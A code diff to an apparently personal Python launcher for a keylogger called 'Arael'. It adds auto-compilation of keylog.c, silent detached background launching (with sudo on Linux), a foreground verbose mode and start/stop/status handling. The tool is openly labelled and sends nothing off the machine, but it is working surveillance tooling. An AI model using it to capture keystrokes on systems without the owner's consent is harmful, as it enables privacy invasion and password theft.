@@ -40,8 +40,16 @@ def find_keyboard_device() -> str:
 def is_running() -> bool:
     if PID_FILE.exists():
         try:
-            pid = int(PID_FILE.read_text())
-            os.kill(pid, 0)        # check signal 0
+            pid_text = PID_FILE.read_text().strip()
+            
+            # Special case for verbose mode
+            if pid_text == "verbose_mode":
+                # We can't easily check the status, so we assume it's running
+                # if the PID file contains our special marker
+                return True
+                
+            pid = int(pid_text)
+            os.kill(pid, 0)  # check signal 0  
             return pid
         except (ValueError, ProcessLookupError, PermissionError):
             PID_FILE.unlink(missing_ok=True)
@@ -49,7 +57,51 @@ def is_running() -> bool:
     return 0
 
 
-def start(verbose=True):
+def compile_linux_binary():
+    """Compile the Linux binary if it doesn't exist."""
+    bin_path = LINUX_BIN
+    src_dir = bin_path.parent
+    
+    print(f"Compiling binary at {bin_path}...")
+    try:
+        # Try using the Makefile first
+        result = subprocess.run(
+            ["make"], 
+            cwd=str(src_dir),
+            capture_output=True,
+            text=True
+        )
+        
+        if result.returncode != 0:
+            # If make fails, try direct gcc compilation
+            print("Makefile compilation failed, trying direct gcc command...")
+            compile_cmd = [
+                "gcc",
+                "-O2",
+                "-std=c11",
+                "-DDEBUG",
+                "-lsqlite3",
+                "keylog.c",
+                "-o",
+                "keylog.exe"
+            ]
+            result = subprocess.run(
+                compile_cmd,
+                cwd=str(src_dir),
+                capture_output=True,
+                text=True
+            )
+            
+        if result.returncode != 0:
+            print(f"Compilation failed: {result.stderr}")
+            return False
+            
+        return bin_path.exists()
+    except Exception as e:
+        print(f"Error during compilation: {e}")
+        return False
+
+def start(verbose=False):
     if is_running():
         print("keylogger already running")
         return
@@ -65,39 +117,77 @@ def start(verbose=True):
         cmd      = [str(bin_path)]
         sudo     = False           # not needed; event‑tap runs as user
 
+    # Check if binary exists, if not try to compile it
     if not bin_path.exists():
-        sys.exit(f"binary not found: {bin_path}. compile it first.")
+        print(f"Binary not found at {bin_path}")
+        if os_type == "linux" and compile_linux_binary():
+            print("Successfully compiled binary")
+        else:
+            sys.exit(f"Failed to compile or find binary at {bin_path}")
 
     if sudo:
         cmd.insert(0, "sudo")
 
-    print(cmd)
-
-    redir = None if verbose else subprocess.DEVNULL
-    proc = subprocess.Popen(
-        cmd,
-        stdout=redir,
-        stderr=redir,
-        start_new_session=True,    # decouple from this tty
-    )
-
-    PID_FILE.write_text(str(proc.pid))
-    time.sleep(0.3)
-    if proc.poll() is not None:
-        PID_FILE.unlink(missing_ok=True)
-        sys.exit("keylogger failed to start (check binary manually)")
-    print(f"arael has awakened and is running at [{proc.pid}] ({os_type})")
+    print(f"Starting keylogger with command: {' '.join(cmd)}")
+    
+    # Make a decision if we're running in directly attached (foreground) mode
+    # or in background mode
+    if verbose:
+        # For verbose mode, run it directly as a foreground process, without Python's management
+        # This is the most reliable way to see real-time output
+        print("Running in verbose mode - press Ctrl+C to stop")
+        print(f"Command: {' '.join(cmd)}")
+        
+        # Write a dummy PID file so status check works
+        # We're relying on the direct process, not something we manage
+        PID_FILE.write_text("verbose_mode")
+        
+        # Execute the command directly, replacing the current process
+        # This allows output to flow directly to the terminal
+        try:
+            # Use os.execvp which replaces the current process with the new one
+            os.execvp(cmd[0], cmd)
+        except Exception as e:
+            PID_FILE.unlink(missing_ok=True)
+            sys.exit(f"Failed to start keylogger: {e}")
+    else:
+        # Non-verbose mode: run in background with no output
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True,  # decouple from this tty
+        )
+        
+        PID_FILE.write_text(str(proc.pid))
+        time.sleep(0.3)
+        if proc.poll() is not None:
+            PID_FILE.unlink(missing_ok=True)
+            sys.exit("keylogger failed to start (check binary manually)")
+        print(f"arael has awakened and is running at [{proc.pid}] ({os_type})")
 
 
 def stop():
     if not PID_FILE.exists():
         print("no pidfile → not running?")
         return
-    pid = int(PID_FILE.read_text())
+    
+    pid_text = PID_FILE.read_text().strip()
+    
+    # Handle the special case for verbose mode
+    if pid_text == "verbose_mode":
+        print("Keylogger was started in verbose mode and is running in foreground.")
+        print("Please stop it manually with Ctrl+C in the terminal where it's running.")
+        return
+        
     try:
+        pid = int(pid_text)
         os.kill(pid, signal.SIGINT)
+    except ValueError:
+        print("Invalid PID format in pidfile")
     except ProcessLookupError:
-        print("process already gone")
+        print("Process already gone")
+    
     PID_FILE.unlink(missing_ok=True)
     print("keylogger stopped")
 
@@ -126,17 +216,6 @@ def help():
 
 
 def main():
-
-    # if len(sys.argv) < 2 or sys.argv[1] not in {"start", "stop", "status"}:
-    #     help()
-    #     sys.exit(1)
-    # {"help":help, "start": start, "stop": stop, "status": status}[sys.argv[1]]()
-
-    # commands = "sudo /home/evapilotno17/central_dogma/arael2/linux/keylog.exe /dev/input/event3".split(' ')
-    # print(commands)
-
-    # subprocess.run(commands)
-
     parser = argparse.ArgumentParser(prog="Arael", description="a keylogger <3")
     subparsers = parser.add_subparsers(dest="command", required=True)
 
@@ -163,9 +242,20 @@ def main():
     command = args.command
     kwargs = vars(args)
 
-    print(kwargs)
-
-    print(command)
+    # Execute the appropriate function based on command
+    if command == "start":
+        verbose = kwargs.get("verbose", False)
+        start(verbose=verbose)
+    elif command == "stop":
+        stop()
+    elif command == "status":
+        status()
+    elif command == "help":
+        help()
+    elif command == "live":
+        print("Live monitoring not implemented yet")
+    elif command == "logs":
+        print("Log generation not implemented yet")
 
 if __name__ == "__main__":
     main()
